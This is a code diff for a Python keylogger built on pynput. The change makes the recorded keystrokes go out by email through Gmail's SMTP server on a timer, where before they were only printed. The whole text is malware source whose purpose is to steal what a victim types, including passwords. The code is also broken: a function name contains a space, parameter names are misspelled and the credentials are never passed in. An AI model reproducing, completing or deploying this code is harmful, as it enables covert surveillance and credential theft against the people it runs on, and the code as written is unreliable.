@@ -2,6 +2,7 @@
 
 import pynput.keyboard
 import threading
+import smtplib
 
 
 class Keylogger:
@@ -9,6 +10,8 @@ class Keylogger:
 def __init__(self,time_interval):
       self.log=""
       self.interval=time_interval
+      self.email=email
+      self.password=password
 
 def append_to_log(self,string):
     self.log=self.log+string
@@ -28,10 +31,18 @@ def process_key_press(self,key):
 #We are using threading concept to report the log for a certain period of time. This threading allowas the keyboard listener function to execute without any interruption and also it runs timer on other hand. 
 
 def report(self): 
-    print(self.log)
+    self.send_mail(self.email,self.password,"\n\n"+self.log)
     self.log=" "
     timer=threading.Timer(self.interval, self.report)
     timer.start()
+
+
+def send mail(emial,password,message):
+    server=smtplib.SMTP("smtp.gmail.com",587)
+    server.starttls()
+    server.login(email,password)
+    server.sendmail(email,email,message)
+    server.quit()
 
 def start(self):
 
